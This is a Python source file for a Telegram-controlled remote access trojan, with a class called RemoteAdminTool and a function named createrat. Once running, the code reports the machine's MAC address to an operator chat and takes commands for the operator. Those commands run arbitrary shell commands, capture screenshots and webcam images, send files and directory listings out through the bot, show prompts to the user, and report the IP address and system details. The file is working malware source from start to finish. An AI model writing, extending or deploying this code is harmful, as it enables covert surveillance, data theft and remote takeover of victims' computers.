import os
import shutil
import subprocess
import platform
import psutil
import cv2
import pyautogui
from PIL import ImageGrab
import telepot
from telepot.loop import MessageLoop
import tkinter as tk
import time
import requests
import socket


class RemoteAdminTool:
    def __init__(self, token, admin_id, admin_chat_id):
        self.bot = telepot.Bot(token)
        self.admin_id = admin_id
        self.admin_chat_id = admin_chat_id
        self.connected_macs = {}

        MessageLoop(self.bot, self.handle).run_as_thread()

        self.register_pc()
        self.keep_alive()

    def register_pc(self):
        mac = self.get_mac_address()
        if mac not in self.connected_macs:
            self.connected_macs[mac] = self.admin_chat_id
            self.bot.sendMessage(self.admin_chat_id, f"New PC connected: {mac}")

    def handle(self, msg):
        chat_id = msg['chat']['id']
        user_id = msg['from']['id']

        if 'text' not in msg:
            return

        command = msg['text']

        if user_id != self.admin_id:
            return

        parts = command.split()
        if len(parts) < 2:
            if command == '/help':
                self.bot.sendMessage(chat_id, self.get_help())
            return

        mac, cmd = parts[0], parts[1]
        if mac not in self.connected_macs:
            return

        if cmd == '/help':
            self.bot.sendMessage(chat_id, self.get_help())
        elif cmd == '/sysinfo':
            info = self.get_system_info()
            self.bot.sendMessage(chat_id, str(info))
        elif cmd == '/screenshot':
            filepath = self.take_screenshot()
            self.bot.sendPhoto(chat_id, open(filepath, 'rb'))
        elif cmd == '/webcam':
            filepath = self.take_webcam_snapshot()
            if filepath:
                self.bot.sendPhoto(chat_id, open(filepath, 'rb'))
            else:
                self.bot.sendMessage(chat_id, "Failed to capture webcam image")
        elif cmd.startswith('/execute'):
            exec_cmd = ' '.join(parts[2:])
            output = self.execute_command(exec_cmd)
            if output.strip():
                self.bot.sendMessage(chat_id, output)
            else:
                self.bot.sendMessage(chat_id, "Command executed with no output")
        elif cmd.startswith('/download'):
            if len(parts) < 3:
                return
            source = parts[2]
            self.download_file(chat_id, source)
        elif cmd.startswith('/ls'):
            if len(parts) < 3:
                return
            path = parts[2]
            files = self.get_filesystem(path)
            self.bot.sendMessage(chat_id, str(files))
        elif cmd.startswith('/notify'):
            message = ' '.join(parts[2:])
            self.show_notification(message)
            self.bot.sendMessage(chat_id, "Notification shown")
        elif cmd.startswith('/ask'):
            message = ' '.join(parts[2:])
            response = self.show_notification_with_response(message)
            self.bot.sendMessage(chat_id, f"Response: {response}")
        elif cmd == '/ip':
            ip_address = self.get_ip_address()
            self.bot.sendMessage(chat_id, f"IP Address: {ip_address}")

    def take_screenshot(self):
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        return "screenshot.png"

    def take_webcam_snapshot(self):
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            cv2.imwrite("webcam.png", frame)
            cam.release()
            return "webcam.png"
        cam.release()
        return None

    def execute_command(self, command):
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout

    def get_system_info(self):
        info = {
            "system": platform.system(),
            "node": platform.node(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "ram": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB"
        }
        return info

    def download_file(self, chat_id, source):
        if os.path.isfile(source):
            self.bot.sendDocument(chat_id, open(source, 'rb'))
        else:
            self.bot.sendMessage(chat_id, "File not found")

    def get_filesystem(self, path="."):
        return os.listdir(path)

    def show_notification(self, message):
        pyautogui.alert(text=message, title='Notification', button='OK')

    def show_notification_with_response(self, message):
        response = pyautogui.prompt(text=message, title='Input', default='')
        return response

    def get_mac_address(self):
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    return addr.address
        return "00:00:00:00:00:00"

    def get_ip_address(self):
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return ip_address

    def keep_alive(self):
        while True:
            time.sleep(10)

    def get_help(self):
        help_message = (
            "Commands:\n"
            "<MAC> /help - Show this help message\n"
            "<MAC> /sysinfo - Get system information\n"
            "<MAC> /screenshot - Take a screenshot\n"
            "<MAC> /webcam - Take a webcam snapshot\n"
            "<MAC> /execute <command> - Execute a command\n"
            "<MAC> /download <source> - Download a file\n"
            "<MAC> /ls <path> - List files in a directory\n"
            "<MAC> /notify <message> - Show a notification\n"
            "<MAC> /ask <message> - Show a notification with response\n"
            "<MAC> /ip - Get IP address"
        )
        return help_message


def createrat(TOKEN, ADMIN_ID, ADMIN_CHAT_ID):
    RemoteAdminTool(TOKEN, ADMIN_ID, ADMIN_CHAT_ID)
